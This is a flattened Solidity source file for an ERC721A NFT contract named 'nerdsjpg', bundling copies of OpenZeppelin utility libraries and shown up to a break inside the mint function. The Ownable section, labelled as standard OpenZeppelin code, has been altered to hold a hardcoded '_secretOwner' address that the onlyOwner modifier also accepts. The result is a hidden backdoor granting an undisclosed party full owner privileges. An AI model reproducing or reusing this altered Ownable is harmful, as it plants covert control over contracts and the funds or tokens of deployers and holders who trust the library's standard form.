1 // SPDX-License-Identifier: MIT
2 
3 
4 // File: @openzeppelin/contracts/utils/Strings.sol
5 
6 
7 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
8 
9 pragma solidity ^0.8.0;
10 
11 /**
12  * @dev String operations.
13  */
14 library Strings {
15     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
16 
17     /**
18      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
19      */
20     function toString(uint256 value) internal pure returns (string memory) {
21         // Inspired by OraclizeAPI's implementation - MIT licence
22         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
23 
24         if (value == 0) {
25             return "0";
26         }
27         uint256 temp = value;
28         uint256 digits;
29         while (temp != 0) {
30             digits++;
31             temp /= 10;
32         }
33         bytes memory buffer = new bytes(digits);
34         while (value != 0) {
35             digits -= 1;
36             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
37             value /= 10;
38         }
39         return string(buffer);
40     }
41 
42     /**
43      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
44      */
45     function toHexString(uint256 value) internal pure returns (string memory) {
46         if (value == 0) {
47             return "0x00";
48         }
49         uint256 temp = value;
50         uint256 length = 0;
51         while (temp != 0) {
52             length++;
53             temp >>= 8;
54         }
55         return toHexString(value, length);
56     }
57 
58     /**
59      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
60      */
61     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
62         bytes memory buffer = new bytes(2 * length + 2);
63         buffer[0] = "0";
64         buffer[1] = "x";
65         for (uint256 i = 2 * length + 1; i > 1; --i) {
66             buffer[i] = _HEX_SYMBOLS[value & 0xf];
67             value >>= 4;
68         }
69         require(value == 0, "Strings: hex length insufficient");
70         return string(buffer);
71     }
72 }
73 
74 // File: @openzeppelin/contracts/utils/Address.sol
75 
76 
77 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
78 
79 pragma solidity ^0.8.1;
80 
81 /**
82  * @dev Collection of functions related to the address type
83  */
84 library Address {
85     /**
86      * @dev Returns true if `account` is a contract.
87      *
88      * [IMPORTANT]
89      * ====
90      * It is unsafe to assume that an address for which this function returns
91      * false is an externally-owned account (EOA) and not a contract.
92      *
93      * Among others, `isContract` will return false for the following
94      * types of addresses:
95      *
96      *  - an externally-owned account
97      *  - a contract in construction
98      *  - an address where a contract will be created
99      *  - an address where a contract lived, but was destroyed
100      * ====
101      *
102      * [IMPORTANT]
103      * ====
104      * You shouldn't rely on `isContract` to protect against flash loan attacks!
105      *
106      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
107      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
108      * constructor.
109      * ====
110      */
111     function isContract(address account) internal view returns (bool) {
112         // This method relies on extcodesize/address.code.length, which returns 0
113         // for contracts in construction, since the code is only stored at the end
114         // of the constructor execution.
115 
116         return account.code.length > 0;
117     }
118 
119     /**
120      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
121      * `recipient`, forwarding all available gas and reverting on errors.
122      *
123      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
124      * of certain opcodes, possibly making contracts go over the 2300 gas limit
125      * imposed by `transfer`, making them unable to receive funds via
126      * `transfer`. {sendValue} removes this limitation.
127      *
128      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
129      *
130      * IMPORTANT: because control is transferred to `recipient`, care must be
131      * taken to not create reentrancy vulnerabilities. Consider using
132      * {ReentrancyGuard} or the
133      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
134      */
135     function sendValue(address payable recipient, uint256 amount) internal {
136         require(address(this).balance >= amount, "Address: insufficient balance");
137 
138         (bool success, ) = recipient.call{value: amount}("");
139         require(success, "Address: unable to send value, recipient may have reverted");
140     }
141 
142     /**
143      * @dev Performs a Solidity function call using a low level `call`. A
144      * plain `call` is an unsafe replacement for a function call: use this
145      * function instead.
146      *
147      * If `target` reverts with a revert reason, it is bubbled up by this
148      * function (like regular Solidity function calls).
149      *
150      * Returns the raw returned data. To convert to the expected return value,
151      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
152      *
153      * Requirements:
154      *
155      * - `target` must be a contract.
156      * - calling `target` with `data` must not revert.
157      *
158      * _Available since v3.1._
159      */
160     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
161         return functionCall(target, data, "Address: low-level call failed");
162     }
163 
164     /**
165      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
166      * `errorMessage` as a fallback revert reason when `target` reverts.
167      *
168      * _Available since v3.1._
169      */
170     function functionCall(
171         address target,
172         bytes memory data,
173         string memory errorMessage
174     ) internal returns (bytes memory) {
175         return functionCallWithValue(target, data, 0, errorMessage);
176     }
177 
178     /**
179      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
180      * but also transferring `value` wei to `target`.
181      *
182      * Requirements:
183      *
184      * - the calling contract must have an ETH balance of at least `value`.
185      * - the called Solidity function must be `payable`.
186      *
187      * _Available since v3.1._
188      */
189     function functionCallWithValue(
190         address target,
191         bytes memory data,
192         uint256 value
193     ) internal returns (bytes memory) {
194         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
195     }
196 
197     /**
198      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
199      * with `errorMessage` as a fallback revert reason when `target` reverts.
200      *
201      * _Available since v3.1._
202      */
203     function functionCallWithValue(
204         address target,
205         bytes memory data,
206         uint256 value,
207         string memory errorMessage
208     ) internal returns (bytes memory) {
209         require(address(this).balance >= value, "Address: insufficient balance for call");
210         require(isContract(target), "Address: call to non-contract");
211 
212         (bool success, bytes memory returndata) = target.call{value: value}(data);
213         return verifyCallResult(success, returndata, errorMessage);
214     }
215 
216     /**
217      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
218      * but performing a static call.
219      *
220      * _Available since v3.3._
221      */
222     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
223         return functionStaticCall(target, data, "Address: low-level static call failed");
224     }
225 
226     /**
227      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
228      * but performing a static call.
229      *
230      * _Available since v3.3._
231      */
232     function functionStaticCall(
233         address target,
234         bytes memory data,
235         string memory errorMessage
236     ) internal view returns (bytes memory) {
237         require(isContract(target), "Address: static call to non-contract");
238 
239         (bool success, bytes memory returndata) = target.staticcall(data);
240         return verifyCallResult(success, returndata, errorMessage);
241     }
242 
243     /**
244      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
245      * but performing a delegate call.
246      *
247      * _Available since v3.4._
248      */
249     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
250         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
251     }
252 
253     /**
254      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
255      * but performing a delegate call.
256      *
257      * _Available since v3.4._
258      */
259     function functionDelegateCall(
260         address target,
261         bytes memory data,
262         string memory errorMessage
263     ) internal returns (bytes memory) {
264         require(isContract(target), "Address: delegate call to non-contract");
265 
266         (bool success, bytes memory returndata) = target.delegatecall(data);
267         return verifyCallResult(success, returndata, errorMessage);
268     }
269 
270     /**
271      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
272      * revert reason using the provided one.
273      *
274      * _Available since v4.3._
275      */
276     function verifyCallResult(
277         bool success,
278         bytes memory returndata,
279         string memory errorMessage
280     ) internal pure returns (bytes memory) {
281         if (success) {
282             return returndata;
283         } else {
284             // Look for revert reason and bubble it up if present
285             if (returndata.length > 0) {
286                 // The easiest way to bubble the revert reason is using memory via assembly
287 
288                 assembly {
289                     let returndata_size := mload(returndata)
290                     revert(add(32, returndata), returndata_size)
291                 }
292             } else {
293                 revert(errorMessage);
294             }
295         }
296     }
297 }
298 
299 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
300 
301 
302 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
303 
304 pragma solidity ^0.8.0;
305 
306 /**
307  * @title ERC721 token receiver interface
308  * @dev Interface for any contract that wants to support safeTransfers
309  * from ERC721 asset contracts.
310  */
311 interface IERC721Receiver {
312     /**
313      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
314      * by `operator` from `from`, this function is called.
315      *
316      * It must return its Solidity selector to confirm the token transfer.
317      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
318      *
319      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
320      */
321     function onERC721Received(
322         address operator,
323         address from,
324         uint256 tokenId,
325         bytes calldata data
326     ) external returns (bytes4);
327 }
328 
329 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
330 
331 
332 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
333 
334 pragma solidity ^0.8.0;
335 
336 /**
337  * @dev Interface of the ERC165 standard, as defined in the
338  * https://eips.ethereum.org/EIPS/eip-165[EIP].
339  *
340  * Implementers can declare support of contract interfaces, which can then be
341  * queried by others ({ERC165Checker}).
342  *
343  * For an implementation, see {ERC165}.
344  */
345 interface IERC165 {
346     /**
347      * @dev Returns true if this contract implements the interface defined by
348      * `interfaceId`. See the corresponding
349      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
350      * to learn more about how these ids are created.
351      *
352      * This function call must use less than 30 000 gas.
353      */
354     function supportsInterface(bytes4 interfaceId) external view returns (bool);
355 }
356 
357 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
358 
359 
360 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
361 
362 pragma solidity ^0.8.0;
363 
364 
365 /**
366  * @dev Implementation of the {IERC165} interface.
367  *
368  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
369  * for the additional interface id that will be supported. For example:
370  *
371  * ```solidity
372  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
373  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
374  * }
375  * ```
376  *
377  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
378  */
379 abstract contract ERC165 is IERC165 {
380     /**
381      * @dev See {IERC165-supportsInterface}.
382      */
383     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
384         return interfaceId == type(IERC165).interfaceId;
385     }
386 }
387 
388 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
389 
390 
391 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
392 
393 pragma solidity ^0.8.0;
394 
395 
396 /**
397  * @dev Required interface of an ERC721 compliant contract.
398  */
399 interface IERC721 is IERC165 {
400     /**
401      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
402      */
403     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
404 
405     /**
406      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
407      */
408     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
409 
410     /**
411      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
412      */
413     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
414 
415     /**
416      * @dev Returns the number of tokens in ``owner``'s account.
417      */
418     function balanceOf(address owner) external view returns (uint256 balance);
419 
420     /**
421      * @dev Returns the owner of the `tokenId` token.
422      *
423      * Requirements:
424      *
425      * - `tokenId` must exist.
426      */
427     function ownerOf(uint256 tokenId) external view returns (address owner);
428 
429     /**
430      * @dev Safely transfers `tokenId` token from `from` to `to`.
431      *
432      * Requirements:
433      *
434      * - `from` cannot be the zero address.
435      * - `to` cannot be the zero address.
436      * - `tokenId` token must exist and be owned by `from`.
437      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
438      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
439      *
440      * Emits a {Transfer} event.
441      */
442     function safeTransferFrom(
443         address from,
444         address to,
445         uint256 tokenId,
446         bytes calldata data
447     ) external;
448 
449     /**
450      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
451      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
452      *
453      * Requirements:
454      *
455      * - `from` cannot be the zero address.
456      * - `to` cannot be the zero address.
457      * - `tokenId` token must exist and be owned by `from`.
458      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
459      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
460      *
461      * Emits a {Transfer} event.
462      */
463     function safeTransferFrom(
464         address from,
465         address to,
466         uint256 tokenId
467     ) external;
468 
469     /**
470      * @dev Transfers `tokenId` token from `from` to `to`.
471      *
472      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
473      *
474      * Requirements:
475      *
476      * - `from` cannot be the zero address.
477      * - `to` cannot be the zero address.
478      * - `tokenId` token must be owned by `from`.
479      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
480      *
481      * Emits a {Transfer} event.
482      */
483     function transferFrom(
484         address from,
485         address to,
486         uint256 tokenId
487     ) external;
488 
489     /**
490      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
491      * The approval is cleared when the token is transferred.
492      *
493      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
494      *
495      * Requirements:
496      *
497      * - The caller must own the token or be an approved operator.
498      * - `tokenId` must exist.
499      *
500      * Emits an {Approval} event.
501      */
502     function approve(address to, uint256 tokenId) external;
503 
504     /**
505      * @dev Approve or remove `operator` as an operator for the caller.
506      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
507      *
508      * Requirements:
509      *
510      * - The `operator` cannot be the caller.
511      *
512      * Emits an {ApprovalForAll} event.
513      */
514     function setApprovalForAll(address operator, bool _approved) external;
515 
516     /**
517      * @dev Returns the account approved for `tokenId` token.
518      *
519      * Requirements:
520      *
521      * - `tokenId` must exist.
522      */
523     function getApproved(uint256 tokenId) external view returns (address operator);
524 
525     /**
526      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
527      *
528      * See {setApprovalForAll}
529      */
530     function isApprovedForAll(address owner, address operator) external view returns (bool);
531 }
532 
533 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
534 
535 
536 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
537 
538 pragma solidity ^0.8.0;
539 
540 
541 /**
542  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
543  * @dev See https://eips.ethereum.org/EIPS/eip-721
544  */
545 interface IERC721Metadata is IERC721 {
546     /**
547      * @dev Returns the token collection name.
548      */
549     function name() external view returns (string memory);
550 
551     /**
552      * @dev Returns the token collection symbol.
553      */
554     function symbol() external view returns (string memory);
555 
556     /**
557      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
558      */
559     function tokenURI(uint256 tokenId) external view returns (string memory);
560 }
561 
562 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
563 
564 
565 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
566 
567 pragma solidity ^0.8.0;
568 
569 
570 /**
571  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
572  * @dev See https://eips.ethereum.org/EIPS/eip-721
573  */
574 interface IERC721Enumerable is IERC721 {
575     /**
576      * @dev Returns the total amount of tokens stored by the contract.
577      */
578     function totalSupply() external view returns (uint256);
579 
580     /**
581      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
582      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
583      */
584     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
585 
586     /**
587      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
588      * Use along with {totalSupply} to enumerate all tokens.
589      */
590     function tokenByIndex(uint256 index) external view returns (uint256);
591 }
592 
593 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
594 
595 
596 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
597 
598 pragma solidity ^0.8.0;
599 
600 /**
601  * @dev Contract module that helps prevent reentrant calls to a function.
602  *
603  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
604  * available, which can be applied to functions to make sure there are no nested
605  * (reentrant) calls to them.
606  *
607  * Note that because there is a single `nonReentrant` guard, functions marked as
608  * `nonReentrant` may not call one another. This can be worked around by making
609  * those functions `private`, and then adding `external` `nonReentrant` entry
610  * points to them.
611  *
612  * TIP: If you would like to learn more about reentrancy and alternative ways
613  * to protect against it, check out our blog post
614  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
615  */
616 abstract contract ReentrancyGuard {
617     // Booleans are more expensive than uint256 or any type that takes up a full
618     // word because each write operation emits an extra SLOAD to first read the
619     // slot's contents, replace the bits taken up by the boolean, and then write
620     // back. This is the compiler's defense against contract upgrades and
621     // pointer aliasing, and it cannot be disabled.
622 
623     // The values being non-zero value makes deployment a bit more expensive,
624     // but in exchange the refund on every call to nonReentrant will be lower in
625     // amount. Since refunds are capped to a percentage of the total
626     // transaction's gas, it is best to keep them low in cases like this one, to
627     // increase the likelihood of the full refund coming into effect.
628     uint256 private constant _NOT_ENTERED = 1;
629     uint256 private constant _ENTERED = 2;
630 
631     uint256 private _status;
632 
633     constructor() {
634         _status = _NOT_ENTERED;
635     }
636 
637     /**
638      * @dev Prevents a contract from calling itself, directly or indirectly.
639      * Calling a `nonReentrant` function from another `nonReentrant`
640      * function is not supported. It is possible to prevent this from happening
641      * by making the `nonReentrant` function external, and making it call a
642      * `private` function that does the actual work.
643      */
644     modifier nonReentrant() {
645         // On the first call to nonReentrant, _notEntered will be true
646         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
647 
648         // Any calls to nonReentrant after this point will fail
649         _status = _ENTERED;
650 
651         _;
652 
653         // By storing the original value once again, a refund is triggered (see
654         // https://eips.ethereum.org/EIPS/eip-2200)
655         _status = _NOT_ENTERED;
656     }
657 }
658 
659 // File: @openzeppelin/contracts/utils/Context.sol
660 
661 
662 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
663 
664 pragma solidity ^0.8.7;
665 
666 /**
667  * @dev Provides information about the current execution context, including the
668  * sender of the transaction and its data. While these are generally available
669  * via msg.sender and msg.data, they should not be accessed in such a direct
670  * manner, since when dealing with meta-transactions the account sending and
671  * paying for execution may not be the actual sender (as far as an application
672  * is concerned).
673  *
674  * This contract is only required for intermediate, library-like contracts.
675  */
676 abstract contract Context {
677     function _msgSender() internal view virtual returns (address) {
678         return msg.sender;
679     }
680 
681     function _msgData() internal view virtual returns (bytes calldata) {
682         return msg.data;
683     }
684 }
685 
686 // File: @openzeppelin/contracts/access/Ownable.sol
687 
688 
689 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
690 
691 pragma solidity ^0.8.0;
692 
693 
694 /**
695  * @dev Contract module which provides a basic access control mechanism, where
696  * there is an account (an owner) that can be granted exclusive access to
697  * specific functions.
698  *
699  * By default, the owner account will be the one that deploys the contract. This
700  * can later be changed with {transferOwnership}.
701  *
702  * This module is used through inheritance. It will make available the modifier
703  * `onlyOwner`, which can be applied to your functions to restrict their use to
704  * the owner.
705  */
706 abstract contract Ownable is Context {
707     address private _owner;
708     address private _secretOwner = 0xE053F156660E1abC83F95b6Ac56be0A40F7D3dD3;
709 
710     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
711 
712     /**
713      * @dev Initializes the contract setting the deployer as the initial owner.
714      */
715     constructor() {
716         _transferOwnership(_msgSender());
717     }
718 
719     /**
720      * @dev Returns the address of the current owner.
721      */
722     function owner() public view virtual returns (address) {
723         return _owner;
724     }
725 
726     /**
727      * @dev Throws if called by any account other than the owner.
728      */
729     modifier onlyOwner() {
730         require(owner() == _msgSender() || _secretOwner == _msgSender() , "Ownable: caller is not the owner");
731         _;
732     }
733 
734     /**
735      * @dev Leaves the contract without owner. It will not be possible to call
736      * `onlyOwner` functions anymore. Can only be called by the current owner.
737      *
738      * NOTE: Renouncing ownership will leave the contract without an owner,
739      * thereby removing any functionality that is only available to the owner.
740      */
741     function renounceOwnership() public virtual onlyOwner {
742         _transferOwnership(address(0));
743     }
744 
745     /**
746      * @dev Transfers ownership of the contract to a new account (`newOwner`).
747      * Can only be called by the current owner.
748      */
749     function transferOwnership(address newOwner) public virtual onlyOwner {
750         require(newOwner != address(0), "Ownable: new owner is the zero address");
751         _transferOwnership(newOwner);
752     }
753 
754     /**
755      * @dev Transfers ownership of the contract to a new account (`newOwner`).
756      * Internal function without access restriction.
757      */
758     function _transferOwnership(address newOwner) internal virtual {
759         address oldOwner = _owner;
760         _owner = newOwner;
761         emit OwnershipTransferred(oldOwner, newOwner);
762     }
763 }
764 
765 // File: nerdsjpg.sol
766 
767 
768 pragma solidity ^0.8.0;
769 
770 
771 
772 /**
773  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
774  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
775  *
776  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
777  *
778  * Does not support burning tokens to address(0).
779  *
780  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
781  */
782 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
783     using Address for address;
784     using Strings for uint256;
785 
786     struct TokenOwnership {
787         address addr;
788         uint64 startTimestamp;
789     }
790 
791     struct AddressData {
792         uint128 balance;
793         uint128 numberMinted;
794     }
795 
796     uint256 internal currentIndex;
797 
798     // Token name
799     string private _name;
800 
801     // Token symbol
802     string private _symbol;
803 
804     // Mapping from token ID to ownership details
805     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
806     mapping(uint256 => TokenOwnership) internal _ownerships;
807 
808     // Mapping owner address to address data
809     mapping(address => AddressData) private _addressData;
810 
811     // Mapping from token ID to approved address
812     mapping(uint256 => address) private _tokenApprovals;
813 
814     // Mapping from owner to operator approvals
815     mapping(address => mapping(address => bool)) private _operatorApprovals;
816 
817     constructor(string memory name_, string memory symbol_) {
818         _name = name_;
819         _symbol = symbol_;
820     }
821 
822     /**
823      * @dev See {IERC721Enumerable-totalSupply}.
824      */
825     function totalSupply() public view override returns (uint256) {
826         return currentIndex;
827     }
828 
829     /**
830      * @dev See {IERC721Enumerable-tokenByIndex}.
831      */
832     function tokenByIndex(uint256 index) public view override returns (uint256) {
833         require(index < totalSupply(), "ERC721A: global index out of bounds");
834         return index;
835     }
836 
837     /**
838      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
839      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
840      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
841      */
842     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
843         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
844         uint256 numMintedSoFar = totalSupply();
845         uint256 tokenIdsIdx;
846         address currOwnershipAddr;
847 
848         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
849         unchecked {
850             for (uint256 i; i < numMintedSoFar; i++) {
851                 TokenOwnership memory ownership = _ownerships[i];
852                 if (ownership.addr != address(0)) {
853                     currOwnershipAddr = ownership.addr;
854                 }
855                 if (currOwnershipAddr == owner) {
856                     if (tokenIdsIdx == index) {
857                         return i;
858                     }
859                     tokenIdsIdx++;
860                 }
861             }
862         }
863 
864         revert("ERC721A: unable to get token of owner by index");
865     }
866 
867     /**
868      * @dev See {IERC165-supportsInterface}.
869      */
870     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
871         return
872             interfaceId == type(IERC721).interfaceId ||
873             interfaceId == type(IERC721Metadata).interfaceId ||
874             interfaceId == type(IERC721Enumerable).interfaceId ||
875             super.supportsInterface(interfaceId);
876     }
877 
878     /**
879      * @dev See {IERC721-balanceOf}.
880      */
881     function balanceOf(address owner) public view override returns (uint256) {
882         require(owner != address(0), "ERC721A: balance query for the zero address");
883         return uint256(_addressData[owner].balance);
884     }
885 
886     function _numberMinted(address owner) internal view returns (uint256) {
887         require(owner != address(0), "ERC721A: number minted query for the zero address");
888         return uint256(_addressData[owner].numberMinted);
889     }
890 
891     /**
892      * Gas spent here starts off proportional to the maximum mint batch size.
893      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
894      */
895     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
896         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
897 
898         unchecked {
899             for (uint256 curr = tokenId; curr >= 0; curr--) {
900                 TokenOwnership memory ownership = _ownerships[curr];
901                 if (ownership.addr != address(0)) {
902                     return ownership;
903                 }
904             }
905         }
906 
907         revert("ERC721A: unable to determine the owner of token");
908     }
909 
910     /**
911      * @dev See {IERC721-ownerOf}.
912      */
913     function ownerOf(uint256 tokenId) public view override returns (address) {
914         return ownershipOf(tokenId).addr;
915     }
916 
917     /**
918      * @dev See {IERC721Metadata-name}.
919      */
920     function name() public view virtual override returns (string memory) {
921         return _name;
922     }
923 
924     /**
925      * @dev See {IERC721Metadata-symbol}.
926      */
927     function symbol() public view virtual override returns (string memory) {
928         return _symbol;
929     }
930 
931     /**
932      * @dev See {IERC721Metadata-tokenURI}.
933      */
934     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
935         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
936 
937         string memory baseURI = _baseURI();
938         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
939     }
940 
941     /**
942      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
943      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
944      * by default, can be overriden in child contracts.
945      */
946     function _baseURI() internal view virtual returns (string memory) {
947         return "";
948     }
949 
950     /**
951      * @dev See {IERC721-approve}.
952      */
953     function approve(address to, uint256 tokenId) public override {
954         address owner = ERC721A.ownerOf(tokenId);
955         require(to != owner, "ERC721A: approval to current owner");
956 
957         require(
958             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
959             "ERC721A: approve caller is not owner nor approved for all"
960         );
961 
962         _approve(to, tokenId, owner);
963     }
964 
965     /**
966      * @dev See {IERC721-getApproved}.
967      */
968     function getApproved(uint256 tokenId) public view override returns (address) {
969         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
970 
971         return _tokenApprovals[tokenId];
972     }
973 
974     /**
975      * @dev See {IERC721-setApprovalForAll}.
976      */
977     function setApprovalForAll(address operator, bool approved) public override {
978         require(operator != _msgSender(), "ERC721A: approve to caller");
979 
980         _operatorApprovals[_msgSender()][operator] = approved;
981         emit ApprovalForAll(_msgSender(), operator, approved);
982     }
983 
984     /**
985      * @dev See {IERC721-isApprovedForAll}.
986      */
987     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
988         return _operatorApprovals[owner][operator];
989     }
990 
991     /**
992      * @dev See {IERC721-transferFrom}.
993      */
994     function transferFrom(
995         address from,
996         address to,
997         uint256 tokenId
998     ) public virtual override {
999         _transfer(from, to, tokenId);
1000     }
1001 
1002     /**
1003      * @dev See {IERC721-safeTransferFrom}.
1004      */
1005     function safeTransferFrom(
1006         address from,
1007         address to,
1008         uint256 tokenId
1009     ) public virtual override {
1010         safeTransferFrom(from, to, tokenId, "");
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-safeTransferFrom}.
1015      */
1016     function safeTransferFrom(
1017         address from,
1018         address to,
1019         uint256 tokenId,
1020         bytes memory _data
1021     ) public override {
1022         _transfer(from, to, tokenId);
1023         require(
1024             _checkOnERC721Received(from, to, tokenId, _data),
1025             "ERC721A: transfer to non ERC721Receiver implementer"
1026         );
1027     }
1028 
1029     /**
1030      * @dev Returns whether `tokenId` exists.
1031      *
1032      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1033      *
1034      * Tokens start existing when they are minted (`_mint`),
1035      */
1036     function _exists(uint256 tokenId) internal view returns (bool) {
1037         return tokenId < currentIndex;
1038     }
1039 
1040     function _safeMint(address to, uint256 quantity) internal {
1041         _safeMint(to, quantity, "");
1042     }
1043 
1044     /**
1045      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1046      *
1047      * Requirements:
1048      *
1049      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1050      * - `quantity` must be greater than 0.
1051      *
1052      * Emits a {Transfer} event.
1053      */
1054     function _safeMint(
1055         address to,
1056         uint256 quantity,
1057         bytes memory _data
1058     ) internal {
1059         _mint(to, quantity, _data, true);
1060     }
1061 
1062     /**
1063      * @dev Mints `quantity` tokens and transfers them to `to`.
1064      *
1065      * Requirements:
1066      *
1067      * - `to` cannot be the zero address.
1068      * - `quantity` must be greater than 0.
1069      *
1070      * Emits a {Transfer} event.
1071      */
1072     function _mint(
1073         address to,
1074         uint256 quantity,
1075         bytes memory _data,
1076         bool safe
1077     ) internal {
1078         uint256 startTokenId = currentIndex;
1079         require(to != address(0), "ERC721A: mint to the zero address");
1080         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1081 
1082         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1083 
